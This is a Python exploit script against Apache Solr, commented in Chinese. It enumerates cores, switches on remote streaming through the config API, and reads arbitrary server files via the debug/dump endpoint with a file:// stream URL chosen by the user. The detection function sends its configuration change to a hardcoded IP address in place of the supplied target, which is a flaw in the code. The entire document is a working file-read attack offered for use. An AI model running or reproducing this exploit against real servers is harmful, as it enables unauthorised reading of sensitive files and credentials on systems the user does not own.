import requests
import json

#利用漏洞读取文件
def exploit(targetUrl, filePath, coreName):
	targetUrl=targetUrl + "/solr/" + coreName + "/debug/dump?param=ContentStreams"
	header={
			'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
			'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Content-Type':'application/x-www-form-urlencoded'
			}
	post="stream.url=file://" + filePath
	res=requests.post(targetUrl, headers = header,timeout = 15, data=post, verify = False)
	json_str=json.loads(res.text)
	list_res=json_str['streams'][0]
	res_json=json.dumps(list_res)
	return json.loads(res_json)['stream']

#获取判断是否存在漏洞
def determine(targetUrl):
	url=targetUrl + "/solr/admin/cores?indexInfo=false&wt=json"
	header={
			'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
			'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Content-Type':'application/x-www-form-urlencoded'
	}
	res=requests.get(url, headers=header, timeout=15, verify=False)
	res_str=json.loads(res.text)['status']
	res_json=json.loads(json.dumps(res_str))
	for key in res_json:
		coreName=json.loads(json.dumps(res_json[key]))['name']
		url1="http://3.7.1.75:8983/solr/" + coreName + "/config"
		data1="{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
		header1={
			'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
			'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Content-Type':'application/x-www-form-urlencoded'
		}
		res1=requests.post(url1, headers = header1, timeout = 15, data = data1, verify=False)
		if "This response format is experimental.  It is likely to change in the future." in res1.text:
			print('[+] Vulnerability exists')
			return coreName
		else:
			print('[-] Vulnerability does not exist')
			return 0;

def main():
	targetUrl=input("Please input target url >> ")
	coreName=determine(targetUrl)
	if coreName!=0:
		filePath=input("input filePath >> ")
		print(filePath)
		print("[+] File content: ")
		print(exploit(targetUrl, filePath, coreName))



if __name__=="__main__":
	main()

